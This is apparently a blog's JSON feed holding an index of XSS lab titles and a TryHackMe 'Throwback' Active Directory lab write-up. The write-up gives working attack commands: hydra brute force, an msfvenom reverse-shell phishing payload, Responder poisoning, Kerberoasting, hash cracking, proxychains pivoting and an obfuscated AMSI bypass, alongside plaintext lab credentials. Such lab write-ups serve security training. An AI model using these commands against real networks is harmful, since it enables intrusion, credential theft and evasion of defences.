[ { "title": "Web Security Academy: Cross Site Scripting XSS", "url": "/posts/Cross-Site-Scripting-XSS/", "categories": "WriteUp, Web-Security-Academy, XSS", "tags": "xss, jquery, AngularJS, Exploiting, JavaScript, CSP", "date": "2021-04-01 00:00:00 +0200", "snippet": "DisclamirAll solved labs can be found here at Web Security Academyhttps://portswigger.net/web-security/all-labs0. Index### 1. Reflected XSS into HTML context with nothing encoded### 2. Stored XSS into HTML context with nothing encoded### 3. DOM XSS in document.write sink using source location.search### 4. DOM XSS in innerHTML sink using source location.search### 5. DOM XSS in jQuery anchor href attribute sink using location.search source### 6. DOM XSS in jQuery selector sink using a hashchange event### 7. Reflected XSS into attribute with angle brackets HTML-encoded### 8. Stored XSS into anchor href attribute with double quotes HTML-encoded### 9. Reflected XSS into a JavaScript string with angle brackets HTML encoded### 10. DOM XSS in document.write sink using source location.search inside a select element### 11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-en coded### 12. Reflected DOM XSS### 13. Stored DOM XSS### 14. Exploiting cross-site scripting to steal cookies### 15. Exploiting cross-site scripting to capture passwords### 16. Exploiting XSS to perform CSRF### 17. Reflected XSS into HTML context with most tags and attributes blocked### 18. Reflected XSS into HTML context with all tags blocked except custom ones### 19. Reflected XSS with some SVG markup allowed### 20. Reflected XSS in canonical link tag### 21. Reflected XSS into a JavaScript string with single quote and backslash escaped### 22. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped### 23. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped### 24. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped### 25. Reflected XSS with event handlers and href attributes blocked### 26. Reflected XSS in a JavaScript URL with some characters blocked### 27. Reflected XSS with AngularJS sandbox escape without strings### 28. Reflected XSS with AngularJS sandbox escape and CSP### 29. Reflected XSS protected by very strict CSP, with dangling markup attack### 30. Reflected XSS protected by CSP, with CSP bypass1. Reflected XSS into HTML context with nothing encoded2. Stored XSS into HTML context with nothing encoded3. DOM XSS in document.write sink using source location.search4. DOM XSS in innerHTML sink using source location.search5. DOM XSS in jQuery anchor href attribute sink using location.search source6. DOM XSS in jQuery selector sink using a hashchange event7. Reflected XSS into attribute with angle brackets HTML-encoded8. Stored XSS into anchor href attribute with double quotes HTML-encoded9. Reflected XSS into a JavaScript string with angle brackets HTML encoded10. DOM XSS in document.write sink using source location.search inside a select element11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-en coded12. Reflected DOM XSS13. Stored DOM XSS14. Exploiting cross-site scripting to steal cookies15. Exploiting cross-site scripting to capture passwords16. Exploiting XSS to perform CSRF17. Reflected XSS into HTML context with most tags and attributes blocked18. Reflected XSS into HTML context with all tags blocked except custom ones19. Reflected XSS with some SVG markup allowed20. Reflected XSS in canonical link tag21. Reflected XSS into a JavaScript string with single quote and backslash escaped22. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped23. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped24. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped25. Reflected XSS with event handlers and href attributes blocked26. Reflected XSS in a JavaScript URL with some characters blocked27. Reflected XSS with AngularJS sandbox escape without strings28. Reflected XSS with AngularJS sandbox escape and CSP29. Reflected XSS protected by very strict CSP, with dangling markup attack30. Reflected XSS protected by CSP, with CSP bypass" }, { "title": "TryHackMe: ThrowBack Network Penetration Test Report", "url": "/posts/Try-Hack-Me-Throwback-Write-Up/", "categories": "WriteUp, TryHackMe, ActiveDirectory", "tags": "Enumeration, C2, Powershell, Kerberos, pivot, Macros", "date": "2021-01-01 00:00:00 +0100", "snippet": "1. DisclamirIntroductionThrowback is an Active Directory (AD) lab that teaches the fundamentals and core concepts of attacking a Windows network. The network simulates a realistic corporate environment that has several attack vectors you would expect to find in today’s organisations.The lab uses a structured, hand-held approach to guide users through exploiting the network. The use of Windows to manage authentication and user identities in IT infrastructure today is so commonly used; as an aspiring security practitioner, it’s crucial to understand how this works and the network’s common weaknesses.You will explore the following attacks:Phishing &amp;amp; OSINTOffensive PowershellActive Directory BasicsKerberos AbuseCustom Malicious MacrosActive Directory Enumeration &amp;amp; ExploitationAttacking Mail ServersFirewall PivotingC2 FrameworksAbusing Cross-Domain TrustsThis network has been designed to have multiple attack paths.1.1 ScopeThe network was made up of 11 machines. We only provided the ip address of the public-facing. The scope of the assessment included the following:As we got from the gif that we only know 3-IPs of all the machines: Throwback-FW01: 10.200.154.138 Throwback-MAIL: 10.200.154.232 Throwback-PROD: 10.200.154.219There are another 3-machines in our domain.There are another 5-machines in another domain.1.2 Summary of ResultsDuring the time of engagement, I have successfully found several critical vulnerabilities including theability to run arbitrary commands on each host mentioned above which could lead to the full compro‑mise of the Throwback network. Initial reconnaissance was lead us to Throwback-FW01 and Throwback-mail web pages. We used Throwback-FW01 web page to get the first RCE. We used the guest mail/password to login and get all users mails, phishing them and got RCE on Throwback-WS01 which is our second one. From those 2-RCEs we started to compromise all the network.2. Enumeration2.1 Throwback-FW01: 10.200.154.1382.1.1 Initial Information The IP address is publicly available: 10.200.154.1382.1.2 Enumeration2.1.2.1 nmap initial scannmap -T4 -p 1-15000 -oN nmap/initial_fw01 10.200.154.138# Nmap 7.92 scan initiated Wed Dec 1 20:25:17 2021 as: nmap -T4 -p 1-15000 -oN nmap/initial_fw01 10.200.154.138Nmap scan report for 10.200.154.138Host is up (0.26s latency).Not shown: 14996 filtered tcp ports (no-response)PORT STATE SERVICE22/tcp open ssh53/tcp open domain80/tcp open http443/tcp open https# Nmap done at Wed Dec 1 20:27:42 2021 -- 1 IP address (1 host up) scanned in 145.09 seconds2.1.2.2 nmap full scannmap -A -p22,53,80,443 -oN nmap/all_fw01 10.200.154.138# Nmap 7.92 scan initiated Wed Dec 1 20:29:13 2021 as: nmap -A -p22,53,80,443 -oN nmap/all_fw01 10.200.154.138Nmap scan report for 10.200.154.138Host is up (0.30s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.5 (protocol 2.0)| ssh-hostkey:|_ 4096 38:04:a0:a1:d0:e6:ab:d9:7d:c0:da:f3:66:bf:77:15 (RSA)53/tcp open domain (generic dns response: REFUSED)80/tcp open http nginx|_http-title: Did not follow redirect to https://10.200.154.138/443/tcp open ssl/http nginx| ssl-cert: Subject: commonName=pfSense-5f099cf870c18/organizationName=pfSense webConfigurator Self-Signed Certificate| Subject Alternative Name: DNS:pfSense-5f099cf870c18| Not valid before: 2020-07-11T11:05:28|_Not valid after: 2021-08-13T11:05:28|_http-title: pfSense - Login1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port53-TCP:V=7.92%I=7%D=12/1%Time=61A7BF06%P=x86_64-pc-linux-gnu%r(DNSVSF:ersionBindReqTCP,E,&quot;\\0\\x0c\\0\\x06\\x81\\x05\\0\\0\\0\\0\\0\\0\\0\\0&quot;);Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning (JUST GUESSING): FreeBSD 11.X (85%)OS CPE: cpe:/o:freebsd:freebsd:11.2Aggressive OS guesses: FreeBSD 11.2-RELEASE (85%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsTRACEROUTE (using port 80/tcp)HOP RTT ADDRESS1 239.65 ms 10.50.151.12 252.74 ms 10.200.154.138OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Dec 1 20:31:44 2021 -- 1 IP address (1 host up) scanned in 151.39 seconds2.2 Throwback-MAIL: 10.200.154.2322.1.1 Initial Information The IP address of the publicly available web host is 10.200.154.2322.2.2 Enumeration2.2.2.1 nmap initial scannmap -T4 -p 1-15000 -oN nmap/initial_mail 10.200.154.232# Nmap 7.92 scan initiated Wed Dec 1 20:35:12 2021 as: nmap -T4 -p 1-15000 -oN nmap/initial_mail 10.200.154.232Nmap scan report for 10.200.154.232Host is up (0.24s latency).Not shown: 14996 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http143/tcp open imap993/tcp open imaps# Nmap done at Wed Dec 1 20:36:58 2021 -- 1 IP address (1 host up) scanned in 105.96 seconds2.2.2.2 nmap full scannmap -A -p22,80,143,993 -oN nmap/All_mail 10.200.154.232# Nmap 7.92 scan initiated Wed Dec 1 21:27:30 2021 as: nmap -A -p22,80,143,993 -oN nmap/All_mail 10.200.154.232Nmap scan report for 10.200.154.232Host is up (0.20s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 f6:14:31:6f:a5:a8:44:bc:5e:c1:bc:1c:5a:75:3d:0b (RSA)| 256 07:67:60:3f:7f:ba:d4:c5:00:39:51:5e:43:6f:49:b9 (ECDSA)|_ 256 e7:63:66:a8:c7:39:5b:01:bb:4f:b6:af:6c:3d:c2:af (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-title: Throwback Hacks - Login|_Requested resource was src/login.php|_http-server-header: Apache/2.4.29 (Ubuntu)143/tcp open imap Dovecot imapd (Ubuntu)|_imap-capabilities: SASL-IR STARTTLS more IMAP4rev1 post-login IDLE LOGIN-REFERRALS have listed capabilities ID OK LOGINDISABLEDA0001 Pre-login ENABLE LITERAL+| ssl-cert: Subject: commonName=ip-10-40-119-232.eu-west-1.compute.internal| Subject Alternative Name: DNS:ip-10-40-119-232.eu-west-1.compute.internal| Not valid before: 2020-07-25T15:51:57|_Not valid after: 2030-07-23T15:51:57|_ssl-date: TLS randomness does not represent time993/tcp open ssl/imap Dovecot imapd (Ubuntu)|_imap-capabilities: AUTH=PLAINA0001 more IMAP4rev1 post-login IDLE LOGIN-REFERRALS have listed capabilities ID OK SASL-IR Pre-login ENABLE LITERAL+| ssl-cert: Subject: commonName=ip-10-40-119-232.eu-west-1.compute.internal| Subject Alternative Name: DNS:ip-10-40-119-232.eu-west-1.compute.internal| Not valid before: 2020-07-25T15:51:57|_Not valid after: 2030-07-23T15:51:57|_ssl-date: TLS randomness does not represent timeWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 993/tcp)HOP RTT ADDRESS1 149.29 ms 10.50.151.12 147.07 ms 10.200.154.232OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Dec 1 21:28:23 2021 -- 1 IP address (1 host up) scanned in 53.11 seconds2.3 Throwback-PROD: 10.200.154.2192.3.1 Initial Information The IP address is publicly available: 10.200.154.2192.3.2 Enumeration2.3.2.1 nmap initial scannmap -T4 -p 1-15000 -oN nmap/initial_prod 10.200.154.219# Nmap 7.92 scan initiated Wed Dec 1 20:54:55 2021 as: nmap -T4 -p 1-15000 -oN nmap/initial_prod 10.200.154.219Nmap scan report for 10.200.154.219Host is up (0.24s latency).Not shown: 14992 filtered tcp ports (no-response)PORT STATE SERVICE22/tcp open ssh80/tcp open http135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds3389/tcp open ms-wbt-server5357/tcp open wsdapi5985/tcp open wsman# Nmap done at Wed Dec 1 20:56:23 2021 -- 1 IP address (1 host up) scanned in 88.30 seconds2.3.2.2 nmap full scannmap -A -p22,80,135,139,445,3389,5357,5985 -oN nmap/All_prod 10.200.154.219# Nmap 7.92 scan initiated Wed Dec 1 21:26:57 2021 as: nmap -A -p22,80,135,139,445,3389,5357,5985 -oN nmap/All_prod 10.200.154.219Nmap scan report for 10.200.154.219Host is up (0.18s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)| ssh-hostkey:| 2048 85:b8:1f:80:46:3d:91:0f:8c:f2:f2:3f:5c:87:67:72 (RSA)| 256 5c:0d:46:e9:42:d4:4d:a0:36:d6:19:e5:f3:ce:49:06 (ECDSA)|_ 256 e2:2a:cb:39:85:0f:73:06:a9:23:9d:bf:be:f7:50:0c (ED25519)80/tcp open http Microsoft IIS httpd 10.0|_http-title: Throwback Hacks| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?3389/tcp open ms-wbt-server Microsoft Terminal Services|_ssl-date: 2021-12-01T19:36:51+00:00; +8m18s from scanner time.| rdp-ntlm-info:| Target_Name: THROWBACK| NetBIOS_Domain_Name: THROWBACK| NetBIOS_Computer_Name: THROWBACK-PROD| DNS_Domain_Name: THROWBACK.local| DNS_Computer_Name: THROWBACK-PROD.THROWBACK.local| DNS_Tree_Name: THROWBACK.local| Product_Version: 10.0.17763|_ System_Time: 2021-12-01T19:36:11+00:00| ssl-cert: Subject: commonName=THROWBACK-PROD.THROWBACK.local| Not valid before: 2021-11-29T17:08:51|_Not valid after: 2022-05-31T17:08:515357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Service Unavailable5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not FoundWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portOS fingerprint not ideal because: Missing a closed TCP port so results incompleteNo OS matches for hostNetwork Distance: 2 hopsService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 8m17s, deviation: 0s, median: 8m17s| smb2-time:| date: 2021-12-01T19:36:11|_ start_date: N/A| smb2-security-mode:| 3.1.1:|_ Message signing enabled but not requiredTRACEROUTE (using port 445/tcp)HOP RTT ADDRESS1 194.29 ms 10.50.151.12 190.03 ms 10.200.154.219OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Dec 1 21:28:33 2021 -- 1 IP address (1 host up) scanned in 96.79 seconds3 throwback-FW01 10.200.154.1383.1 throwback-FW01We started with throwback-WF01. After exploring the web service we found that it’s running pfsense firewall.We tried the default Credentials and it worked.URL: http://10.200.154.138&amp;gt; username: admin&amp;gt; password: pfsenseWe are in. So, As we know pfsense firewall provides a command prompt on the underlying server through the “Diagnostics” tab.We have 4-ways to get a reverse shell from this point.1. Shell2. PHP3. Upload reverse shell4. Add SSH keyLet’s check if the shell works.tcpdump step if the shell was blindtcpdump -i tun0 icmp3.2 ThrowBack-FW01 reverse shellI will use uploading shell way Upload shellyou can download the shell from shell.php don’t forget to change the ip/port. Netcat listener netcat listener: nc -lvnp 44443.3 ThrowBack-FW01 looking for interested files First we take a look for log files. login.log isn’t a default log file.We found a user Credentials. Let’s try to decode it online. HumphreyW:1c13639dba96c7b53d26f7d00956a364:securitycenter4 ThrowBack-Mail 10.200.154.2324.1 ThrowBack-mail web serviceURL: http://10.200.154.232As you see we found a guest credentials in the home page. We will use them to login.However, the benefits to us is getting the company’s address book, giving us a nice list of employees, usernames, and their associated e-mail addresses.4.2 ThrowBack-mail brute forceWe will use hydra to get valid users. We have a users list. So, we need a password list. We have one problem as we don’t know the password policy till now. I will use the password list below.You can download users list from here.You can download passwords list from here.4.2.1 HydraFirst, We need to get the user and password parameter in the request. We can get it with inspect elementNow, we can run hydra:hydra -L names.txt -P pass.txt 10.200.154.232 http-post-form &quot;/src/redirect.php:login_username=^USER^&amp;amp;secretkey=^PASS^:Unknown user or password incorrect&quot;Here we got some valid credentials.Let’s combine them together.4.3 ThrowBack-mail as MurphyFAfter trying the valid credentials we have. I’ve found that MurphyF is the important one. So, let’s login as MurphyF.url: http://10.200.154.232/username: MurphyFpassword: Summer2020From the mail box. We found that there is a mail to reset password. Let’s open it.The reset link needs to resolve the DNS to its IP, but we don’t know it till now. So, Let’s save it as a note.5 ThrowBack-WS01 10.200.154.222As we logged in as DaviesJ:Management2018 on the mail-server http://10.200.154.232. We found an email which include a exe file. So, we have an option here to use a phishing attack.Creating the shellmsfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=443 -f exe -o cleaner.exeNow, we have to create a phishing mail.Don&#39;t forget to change priority to highAfter sending the mail, We will get a callback session.Check the sysinfo.Here we are. We found a new machine with it’s ip 10.200.154.2225.1 ThrowBack-WS01First, we need to migrate our session into a system process. Second, we need to get hashes on this machine.After serval attempts of trying to get the hash of BlaireJ, but failure was our friend.6 ThrowBack-PROD 10.200.154.219First things first, we have a humphrey’s credentials. So we will try ssh, but it doesn’t work. So we goes towards the web service.6.1 ThrowBack-prod web serviceURL: http://10.200.154.219After some digging we have nothing interested here.Let’s back to ThrowBack-PROD as there’s nothing to do with other machines, we have accessed.6.2 ThrowBack-PROD SSH brute force.I’ve used hydra with the credentials we got from throwback-mail. Non of them accessed.6.3-PROD abusing NBT-NS/LLMNR poisoning.One of the easiest ways to collect credentials is abusing NBT-NS/LLMNR poisoning.let’s talk about NBT-NS/LLMNR poisoningLLMNR(Link-Local Multicast Name Resolution) and NetBIOS Name Service (NBT-NS) are windows domain services that works for host identification.LLMNR likes DNS: Allows hosts in the local network to use names instead of IPs.NBT-NS: Used to identify systems on a network by their NetBIOS name.LLMNR PoisoningYou can spoof the source for name resolution on a victim network using responder, a tool used to respond to LLMNR and NBT-NS requests acting as though you know the identity of the host. “Poisoning” the service so that the victims will communicate with our machine. If the host belongs to a resource that requires identification the user and their NTLMv2 hash will be sent to the attacker. These hashes can then be collected from responder and taken offline to be cracked and then used to access the poisoned user’s machines or can be taken into PSExec to get a shell.We will use a tool called Responder. It will listen to multicast NR (Name Request) requests. It will redirect the victim user to our attacking machine instead of demanded machine. Once the victim tries to connect our machine, Responder will steal users credentials username/hash Running Responderresponder -I tun0 -rdw -vafter some minutes we will get a victim. PetersJ is the victim from ThrowBack-PROD.6.4 ThrowBack-PROD cracking password.We have a hashed password. Let’s try to get the password. We will use hashcat.First, you need to download OneRuleToRuleThemAll.hashcat -m 5600 PetersJ.hash /opt/rockyou.txt -r /root/.hashcat/OneRuleToRuleThemAll.rule --debug-mode=1 --debug-file=matched.ruleThe password is: Throwback3176.5 ThrowBack-PROD SSH.Using those credentials to ssh ThrowBack-PROD.Password: Throwback317ssh PetersJ@10.200.154.2196.6 ThrowBack-PROD Privilege Escalation.After checking our rights, We found that we need to escalate our privileges. So, I used starkiller seatbelt module. You can run it from windows or use winpeas.seatbeltwinpeasWe found a AutoLogon credentials: username : BlaireJ Password : 7eQgx6YzxgG3vC45t5k9##### 3.5.6 ThrowBack-PROD useful data.Now, we finished this machine, but we need something to use in the next step: What is the IP of timekeep.throwback.local What is the Domain Controller IP. Use this machine as a pivot to access other machines.Let’s start with timekeep.throwback.localwe will use nslookupnslookup THROWBACK-TIME.throwback.localTo get Domain Controller IP.ipconfig /displaydnsTHROWBACK-TIME.throwback.local : 10.200.154.176THROWBACK-DC01.throwback.local : 10.200.154.117let’s edit our hosts fileecho &quot;10.200.154.176 timekeep.throwback.local&quot; &amp;gt;&amp;gt; /etc/hosts7. Pivot using ThrowBack-PROD sessionWe will use the autoroute module from Metasploit Framework. We need a meterpreter session. Pause Amsi. create a reverse shell as we did before for mail phishing. start the listener on msfconsole.Pausing Amsi.sET-ItEM ( &#39;V&#39;+&#39;aR&#39; + &#39;IA&#39; + &#39;blE:1q2&#39; + &#39;uZx&#39; ) ( [TYpE]( &quot;{1}{0}&quot;-F&#39;F&#39;,&#39;rE&#39; ) ) ; ( GeT-VariaBle ( &quot;1Q2U&quot; +&quot;zX&quot; ) -VaL ).&quot;AssEmbly&quot;.&quot;GETTYPe&quot;(( &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f&#39;Util&#39;,&#39;A&#39;,&#39;Amsi&#39;,&#39;.Management.&#39;,&#39;utomation.&#39;,&#39;s&#39;,&#39;System&#39; ) ).&quot;getfiElD&quot;( ( &quot;{0}{2}{1}&quot; -f&#39;amsi&#39;,&#39;d&#39;,&#39;InitFaile&#39; ),( &quot;{2}{4}{0}{1}{3}&quot; -f &#39;Stat&#39;,&#39;i&#39;,&#39;NonPubli&#39;,&#39;c&#39;,&#39;c,&#39; )).&quot;sETVaLUE&quot;( ${nULl},${tRuE} )The past command is :[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)After getting the reverse shell.then we will use socks_server module and run it.edit proxychains config file. There is 2-versions of proxychains v4/v5. Make sure the version you use from metasploit the same as you use from bash. The same port you use in socks_proxy as conf file.CheckAs we know previsouly that ThrowBack-WS01 port 445 is open. We will check it with using pivot. We can’t check other ports as we don’t know they open/closed.Now, Our proxychains works as expected. So, Let’s detect other machines DC01 and timekeep.8. ThrowBack-Time 10.200.154.1768.1 SSHcredentials: Timekeeper: keeperoftime8.2 SPNAfter checking the opening ports we found that port 3306 is opened. As we know that port related to mysql. Also most of times SQLService accounts will have an SPN. So let’s check it.proxychains GetUserSPNs.py -dc-ip 10.200.154.117 THROWBACK.LOCAL/BlaireJ:7eQgx6YzxgG3vC45t5k9As we expected that SQLService is vulnerable. Let’s try to catch the flag. Let’s get it by using -requestproxychains GetUserSPNs.py -dc-ip 10.200.154.117 THROWBACK.LOCAL/BlaireJ:7eQgx6YzxgG3vC45t5k9 -requestIf you have an error like Kerberos SessionERROR: KRB_AP_ERR_SKEW(Clock skew too great) you need to sync the time with the AD serverproxychains rdate -n 10.200.154.117orproxychains ntpd 10.200.154.117Now, we have the hash let’s retrieve it to plain text.john --wordlist=~/tools/rockyou.txt hashes/sql_server8.3 MYSQLpassword: mysql1337570Let’s dump the database.1. show databases;2. use domain_users;3. show tables;1. show databases;2. use timekeepusers;3. show tables;9. ThrowBack-DC01 10.200.154.117Now, we have a list of users and passwords. Let’s try to use all of them. Add them to valid credentials that we have before. Brute force for valid credentials using cme.proxychains crackmapexec smb 10.200.154.117 -u users.timekeeper -p pass.timekeeperDownload: users.timekeeperDownload: pass.timekeeper9.1 ThrowBack-DC01 SSHNow, we have a valid credentials to domain controller. Let’s connect!9.2 ThrowBack-DC01 BackUp users.Now, we will take a look for all text files in all users files.dir /s /a *.txtWe found a very interested file called backup_notice.txt. We have to read it.There’s a password to the backup user. Let’s login with those new credentials backup:TBH_Backup2348!9.3 ThrowBack-DC01 dumping hashes.We will go for dumping all users hashes.hashcat -m 1000 mercerh /opt/rockyou.txt -r /root/.hashcat/OneRuleToRuleThemAll.rule9.4 ThrowBack-DC01 with mercerh.check MercerH privileges.Now, As we got that mercerh is an admin in the domain controller. So, we have nothing to do in this forest. Let’s look for another forest.I will use C2 module. You can use powerview/ActiveDirectory modules.Let’s remark our notes. Another domain corporate.local 10.200.154.118 for CORP-DC01.corporate.local 10.200.154.243 for CORP-ADT01.corporate.local10. Pivot using ThrowBack-DC01 sessionNow, we have a trusted forest corporate.local with the trusted user MercerH. We can’t use our current pivot session ThrowBack-Prod as corporate.local trust ThrowBack-DC01. We have to use ThrowBack-DC01 as a new pivot session.1. we have 2-sessions session2 from ThrowBack-prod and session3 from ThrowBack-DC01.2. Delete the old routing session.3. Add the new routing session.11. Corporate-DC01 10.200.154.11811.2 Corporate-DC01 with mercerhLet’s connect to the new forest with the credentials we have. Now, you have to change the route to corporate-dc01 session.12 Corporate-ADT01 10.200.154.24312.1 Corporate-ADT01 with DaviesJWe logged in, but we aren’t the admin. let’s take a look.There’s a interested file called server_update.txt. Let’s check it.It a note about using the DNS of 10.200.154.232 . As we know previsouly that this the mail server. So let’s add them.echo &quot;10.200.154.232 mail.corporate.local breachgtfo.local&quot; &amp;gt;&amp;gt; /etc/hostsbreachgtfo.corporate.localmail.corporate.localNow, we tried all our emails and non worked. So we need to look for other email to test in data leaks. First, I will use the sites that recommended for finding users and projects linkedin and GitHub.After trying all users we found, there is a user who have a good note.Rikka Foxx told us that he is the developer. So let’s check his gitub account.After opening the ThrowBack project. There’s a 9-commits. let’s get them.There’s a interesting update in db_connect.php.There’s a credentials.DaviesJ:Management2018Let’s use Powershell to get a shell here. The xfreerdp window that we have for proxychains xfreerdp /u:mercerh /p:pikapikachu7 /cert:ignore /v:10.200.154.118Enter-PSSession -ComputerName corp-adt01.corporate.local -Credential corporate\\DaviesJIt will popup a window to enter the password Management2018Let’s check our privileges.13. TBSEC-DC01 10.200.154.7913.1 TBSEC-DC01 As TBSEC_GUESTThere’s a file called email_update.txt in Dosierk\\Document. Let’s check it.We will use the given mail formate for all users. Let’s get the user list with LeetLinked.python3 leetlinked.py -e &quot;throwback.local&quot; -f 1 &quot;Throwback Hacks&quot;When we run this the output will give us 4 emails.Now let’s convert them to the formate.sed -i &#39;s/throwback.local/TBHSecurity.com/g&#39; last_emailsTry the next command with every departmentsed -n &#39;/@/{s|^|ESM-|};p&#39; last_emailsAfter some trying. There’s a user with leaked credentials.Now, Let’s login with it’s credentials.JStewart:aqAwM53cW8AgRbfrThere’s a credentials.TBSEC_GUEST:WelcomeTBSEC1!13.2 TBSEC-DC01 As TBSEC_GUESTAfter some enumeration. I found that there’s a user with an admin access called TBService. From the name that’s a service user. After get it’s SPN, I decided to Kerberoasing it.We did before with Impacket. So let’s do it in another way with Rubeus. I got the shell to C2 you can do it form shell.The result is:Let’s crack the hash.LOGIN:runas /tbservice “cmd.exe”" } ]
